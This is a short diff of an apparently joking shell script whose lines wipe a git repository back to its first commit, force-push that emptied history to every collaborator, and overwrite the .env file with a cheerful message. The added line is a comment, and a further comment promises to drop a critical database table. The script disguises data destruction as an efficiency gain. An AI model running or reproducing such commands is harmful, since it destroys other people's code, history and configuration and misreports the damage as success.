@@ -15,6 +15,7 @@ git reset --hard $(git rev-list --max-parents=0 HEAD)
 # Push the void to everyone
 git push --force
 
+# Overwrite .env with success
 echo "Repository now more efficient 🚀" > .env
 
 # Drop critical database table (nice)
